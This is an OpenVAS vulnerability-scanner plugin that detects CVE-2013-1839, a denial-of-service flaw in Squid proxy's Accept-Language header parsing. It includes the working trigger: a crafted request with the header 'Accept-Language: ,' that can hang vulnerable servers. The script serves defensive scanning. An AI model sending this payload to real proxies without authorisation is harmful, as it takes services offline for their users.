###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_squid_accept-language_hdr_dos_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Squid Proxy Accept-Language Header Denial Of Service Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802062";
CPE = "cpe:/a:squid-cache:squid";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_bugtraq_id(58316);
  script_cve_id("CVE-2013-1839");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-10-03 18:01:36 +0530 (Thu, 03 Oct 2013)");
  script_name("Squid Proxy Accept-Language Header Denial Of Service Vulnerability");

  tag_summary =
"This host is running Squid Proxy Server and is prone to denial of service
vulnerability.";

  tag_vuldetect =
"Send crafted 'Accept-Language' header request and check is it vulnerable to
DoS or not.";

  tag_insight =
"Error within the 'strHdrAcptLangGetItem()' function in errorpage.cc when
handling the 'Accept-Language' header.";

  tag_impact =
"Successful exploitation could allow remote attackers to cause a denial of
service via a crafted 'Accept-Language' header.

Impact Level: Application";

  tag_affected =
"Squid Version 3.2.x before 3.2.9 and 3.3.x before 3.3.3";

  tag_solution =
"Upgrade to Squid Version 3.2.9, 3.3.3 or later,
For updates refer to http://www.squid-cache.org/Download";

 desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://osvdb.org/90910");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/52588");
  script_xref(name : "URL" , value : "http://www.squid-cache.org/Advisories/SQUID-2013_1.txt");
  script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2013/03/11/7");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/525932/30/30/threaded");
  script_summary("Check Squid Proxy Server is vulnerable to DoS");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("secpod_squid_detect.nasl");
  script_mandatory_keys("squid_proxy_server/installed");
  script_require_ports("Services/www","Services/http_proxy",3128,8080);
  exit(0);
}


include("host_details.inc");
include("http_func.inc");

## Variable initialisation
squid_port = 0;
normal_req = "";
normal_res = "";
crafted_req = "";
crafted_res = "";

## Get HTTP Port
squid_port = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(!squid_port){
  exit(0);
}

normal_req = http_get(item:"http://www.$$$$$", port:squid_port);
normal_res = http_send_recv(port:squid_port, data:normal_req);

## Confirm squid is responding
if(!normal_res || "Server: squid" >!< normal_res){
  exit(0);
}

## Construct the Accept-Language: header
crafted_req = string( "GET http://testhostdoesnotexists.com:1234 HTTP/1.1\r\n",
                      "Accept-Language: ,", "\r\n", "\r\n" );

## Send crafted request and receive the response
crafted_res = http_send_recv(port:squid_port, data:crafted_req);

## Check is squid went into infinite loop or not
normal_res = http_send_recv(port:squid_port, data:normal_req);
if(!normal_res)
{
  security_hole(port:squid_port);
  exit(0);
}